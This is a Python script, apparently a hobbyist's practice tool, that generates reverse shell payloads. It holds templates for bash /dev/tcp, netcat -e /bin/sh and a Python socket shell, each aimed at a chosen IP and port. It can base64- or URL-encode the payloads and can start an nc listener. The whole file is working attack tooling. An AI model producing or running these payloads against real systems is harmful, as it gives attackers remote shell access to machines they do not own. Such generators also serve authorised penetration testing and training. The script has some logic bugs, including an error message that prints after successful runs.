#!/usr/bin/env python3
#python shell generator by h1dr1
#created on feb13,12:07

#Just a simple tool so i don't visit reverse shell generator website 
# and practice coding XD ;) 
# ENJOY IT 

import argparse
import base64
import urllib
import subprocess
class PayloadGenerator:
    def __init__(self,ip_address,port):
        self.ip = ip_address
        self.port = port 
        print(f"Initializing the generator for {self.ip}:{self.port}")
    
        self.templates = {
        "bash": "bash -i >& /dev/tcp/{ip}/{port}/ 0>&1",
        "netcat": "nc -e /bin/sh {ip} {port}",
        "python": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
        }
    def shell_not_exist(self,shell_type):
        if shell_type not in self.templates:
            return f"[!] Error: shell type is not included in the templates"
        



    def get_payload(self,shell_type):
        if self.shell_not_exist(shell_type):
            return None        

        raw_template = self.templates[shell_type]
        final_payload = raw_template.format(ip=self.ip,port=self.port)
        return final_payload
    
    def enc_payload(self,payload,encoding_type):
        if encoding_type == "base64":
            return base64.b64encode(payload.encode('utf-8')).decode('utf-8')
        elif encoding_type == "url":
            return urllib.parse.quote(payload)
        return payload 

    
    def list_available_shells(self):
        return list(self.templates.keys())
    
    def start_listener(self):
        
        print(f"[*] Listener started on {self.ip}:{self.port} ")
        print(f"[*] Press Ctrl+C to stop")
        try:
            subprocess.call(["nc","-lnvp",self.port])
        except  FileExistsError :
            print(f"[!] Error :'nc ' command not found ")
        except KeyboardInterrupt:
            print(f"\n[!] Listener stopped by user ")
if __name__ == "__main__":

    parser = argparse.ArgumentParser(description="Reverse shell generator CLI")

    parser.add_argument("-i","--ip",required=True,help="Listening Ip address")
    parser.add_argument("-p","--port",required=True,help="Listening Port")
    parser.add_argument("-t","--type",default="bash",help="the type of the rev shell")
    parser.add_argument("--list",action="store_true",help="The list of rev shelLs")
    parser.add_argument("-e","--encode",choices=["base64", "url", "none"],help="encoding the payload in base64")
    parser.add_argument("-l","--listen",action="store_true",help="starting a listener on the IP and port ") # a flag to get the action be done action="store_true"
    args = parser.parse_args()

    if args.list:
        gen = PayloadGenerator("0.0.0.0","1337")
        print(f"[*] Supported Shells : {gen.list_available_shells()}")
        exit()
    if not args.ip  or not args.port : 
        parser.error("IP and port are required for the rev shell to be generated fellow hacker")
    generator = PayloadGenerator(args.ip,args.port)

    raw_payload = generator.get_payload(args.type)


    if raw_payload:
        encoded_payload = generator.enc_payload(raw_payload,args.encode)    

        print("-"*40)
        print(f"[*] Generating {args.type} payload for {args.ip}:{args.port}")
        print("-"*40)
        print(encoded_payload)
        print("-"*40)
    if args.listen:
        generator.start_listener()
    else:
        print(f"[!] Error: Shell type '{args.type}' not supported for now")
        print(f"[*] Try using --list to see the available types ")

